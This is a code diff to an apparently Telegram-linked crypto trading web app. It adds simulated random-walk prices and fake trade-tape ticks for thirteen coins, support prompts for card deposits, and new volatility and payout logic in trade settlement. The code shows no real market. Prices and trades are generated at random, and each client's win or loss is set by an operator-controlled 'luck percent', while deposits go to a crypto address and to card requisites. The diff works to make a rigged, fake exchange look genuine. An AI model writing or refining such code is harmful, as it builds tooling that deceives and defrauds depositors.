@@ -50,6 +50,22 @@ polling_lock_conn = None
 market_feed_task: asyncio.Task | None = None
 MARKET_TAPE = deque(maxlen=120)
 ACTIVE_WEB_TRADES: dict[str, dict] = {}
+ASSET_SPECS = {
+    "BTC": {"name": "Bitcoin", "start": 64000.0, "vol": 0.004, "qty_min": 0.01, "qty_max": 2.4},
+    "ETH": {"name": "Ethereum", "start": 3400.0, "vol": 0.005, "qty_min": 0.03, "qty_max": 12.0},
+    "SOL": {"name": "Solana", "start": 145.0, "vol": 0.009, "qty_min": 0.1, "qty_max": 110.0},
+    "XRP": {"name": "Ripple", "start": 0.62, "vol": 0.012, "qty_min": 20.0, "qty_max": 8000.0},
+    "DOGE": {"name": "Dogecoin", "start": 0.18, "vol": 0.015, "qty_min": 120.0, "qty_max": 24000.0},
+    "TON": {"name": "Toncoin", "start": 6.4, "vol": 0.01, "qty_min": 6.0, "qty_max": 1800.0},
+    "ADA": {"name": "Cardano", "start": 0.72, "vol": 0.012, "qty_min": 40.0, "qty_max": 13000.0},
+    "AVAX": {"name": "Avalanche", "start": 35.0, "vol": 0.011, "qty_min": 1.2, "qty_max": 1600.0},
+    "LINK": {"name": "Chainlink", "start": 21.0, "vol": 0.009, "qty_min": 1.0, "qty_max": 1200.0},
+    "TRX": {"name": "TRON", "start": 0.13, "vol": 0.01, "qty_min": 150.0, "qty_max": 42000.0},
+    "MATIC": {"name": "Polygon", "start": 0.94, "vol": 0.013, "qty_min": 20.0, "qty_max": 9000.0},
+    "DOT": {"name": "Polkadot", "start": 8.4, "vol": 0.01, "qty_min": 4.0, "qty_max": 3000.0},
+    "LTC": {"name": "Litecoin", "start": 86.0, "vol": 0.008, "qty_min": 0.2, "qty_max": 240.0},
+}
+MARKET_PRICE_STATE = {k: v["start"] for k, v in ASSET_SPECS.items()}
 
 WEB_I18N = {
     "ru": {
@@ -134,6 +150,8 @@ WEB_I18N = {
         "js_deposit_processing": "Обрабатываем...",
         "js_deposit_error": "не удалось отправить",
         "js_deposit_sent": "Заявка #{id} отправлена админу",
+        "js_card_support_msg": "Для оплаты картой напишите в поддержку и приложите чек.",
+        "js_support_btn": "Перейти в поддержку",
         "js_loading": "Загрузка...",
         "js_side_buy": "ПОКУПКА",
         "js_side_sell": "ПРОДАЖА",
@@ -223,6 +241,8 @@ WEB_I18N = {
         "js_deposit_processing": "Processing...",
         "js_deposit_error": "failed to send",
         "js_deposit_sent": "Request #{id} sent to admin",
+        "js_card_support_msg": "For bank card payment, contact support and attach payment proof.",
+        "js_support_btn": "Open Support",
         "js_loading": "Loading...",
         "js_side_buy": "BUY",
         "js_side_sell": "SELL",
@@ -312,6 +332,8 @@ WEB_I18N = {
         "js_deposit_processing": "Обробляємо...",
         "js_deposit_error": "не вдалося відправити",
         "js_deposit_sent": "Заявка #{id} відправлена адміну",
+        "js_card_support_msg": "Для оплати карткою напишіть у підтримку та додайте чек.",
+        "js_support_btn": "Перейти в підтримку",
         "js_loading": "Завантаження...",
         "js_side_buy": "КУПІВЛЯ",
         "js_side_sell": "ПРОДАЖ",
@@ -473,17 +495,54 @@ def validate_telegram_init_data(init_data: str, bot_token: str) -> dict | None:
     return json.loads(user_raw)
 
 
+def symbol_from_asset_name(name: str) -> str:
+    n = (name or "").strip().lower()
+    aliases = {
+        "bitcoin": "BTC",
+        "ethereum": "ETH",
+        "solana": "SOL",
+        "dogecoin": "DOGE",
+        "litecoin": "LTC",
+        "xrp": "XRP",
+        "cardano": "ADA",
+        "avalanche": "AVAX",
+        "polkadot": "DOT",
+        "chainlink": "LINK",
+        "toncoin": "TON",
+        "tron": "TRX",
+        "polygon": "MATIC",
+    }
+    if n in aliases:
+        return aliases[n]
+    return (name[:5] if name else "UNKN").upper()
+
+
+def next_symbol_price(symbol: str) -> float:
+    spec = ASSET_SPECS.get(symbol)
+    if not spec:
+        base = MARKET_PRICE_STATE.get(symbol, random.uniform(0.3, 800.0))
+        vol = 0.01
+    else:
+        base = MARKET_PRICE_STATE.get(symbol, spec["start"])
+        vol = spec["vol"]
+    drift = (random.random() - 0.5) * 2 * vol
+    updated = max(0.00001, base * (1 + drift))
+    MARKET_PRICE_STATE[symbol] = updated
+    return updated
+
+
 def generate_market_rows(assets) -> list[dict]:
     rows = []
     for asset in assets:
-        price = round(random.uniform(1.2, 120000), 2)
-        day_change = round(random.uniform(-9.5, 9.5), 2)
+        symbol = symbol_from_asset_name(asset["name"])
+        price = next_symbol_price(symbol)
+        day_change = round((random.random() - 0.5) * 18.0, 2)
         rows.append(
             {
                 "id": asset["id"],
                 "name": asset["name"],
-                "symbol": asset["name"][:4].upper(),
-                "price": price,
+                "symbol": symbol,
+                "price": round(price, 2 if price >= 1 else 5),
                 "day_change": day_change,
             }
         )
@@ -491,12 +550,17 @@ def generate_market_rows(assets) -> list[dict]:
 
 
 def generate_tape_tick() -> dict:
-    symbols = ["BTC", "ETH", "SOL", "XRP", "DOGE", "TON", "ADA", "LINK", "AVAX", "TRX"]
-    symbol = random.choice(symbols)
-    price = round(random.uniform(0.1, 120000), 2)
-    qty = round(random.uniform(0.01, 12.5), 4)
-    side = random.choice(["buy", "sell"])
-    return {"symbol": symbol, "price": price, "qty": qty, "side": side}
+    symbol = random.choice(list(ASSET_SPECS.keys()))
+    spec = ASSET_SPECS[symbol]
+    price = next_symbol_price(symbol)
+    qty = round(random.uniform(spec["qty_min"], spec["qty_max"]), 4)
+    side = "buy" if random.random() > 0.48 else "sell"
+    return {
+        "symbol": symbol,
+        "price": round(price, 2 if price >= 1 else 5),
+        "qty": qty,
+        "side": side,
+    }
 
 
 async def market_feed_loop():
@@ -682,6 +746,8 @@ async def deposit_page(request: Request):
             "trc20_address": bot.config.trc20_address,
             "card_pay_url": bot.config.card_pay_url,
             "card_requisites": bot.config.card_requisites,
+            "support_url": bot.config.support_url,
+            "support_contact": bot.support_contact_text(),
             "lang": lang,
             "labels": labels,
         },
@@ -1165,13 +1231,23 @@ async def settle_web_trade(trade_id: str) -> dict | None:
     luck_percent = await bot.get_luck_percent_for_client(tg_id)
     win_prob = max(0.0, min(1.0, (luck_percent / 100.0) if luck_percent is not None else 0.5))
     is_win = random.random() < win_prob
-    change_percent = random.uniform(0.1, 1.0) * max(1, leverage / 5)
+    asset_key = (asset_name or "").lower()
+    if "bitcoin" in asset_key or "btc" in asset_key:
+        base_vol = 0.28
+    elif "doge" in asset_key or "pepe" in asset_key or "shiba" in asset_key:
+        base_vol = 1.3
+    elif "sol" in asset_key or "avax" in asset_key or "injective" in asset_key:
+        base_vol = 0.85
+    else:
+        base_vol = 0.55
+    impulse = random.uniform(0.8, 1.8)
+    change_percent = random.uniform(base_vol * 0.35, base_vol * impulse) * max(1, leverage / 6)
     if (direction == "up" and is_win) or (direction == "down" and not is_win):
         end_price = start_price * (1 + change_percent / 100)
     else:
         end_price = start_price * (1 - change_percent / 100)
 
-    payout_rate = 0.6
+    payout_rate = random.choice([0.55, 0.6, 0.62, 0.65])
     profit = amount * payout_rate if is_win else -amount
     if is_win:
         await bot.change_balance(tg_id, amount + (amount * payout_rate))
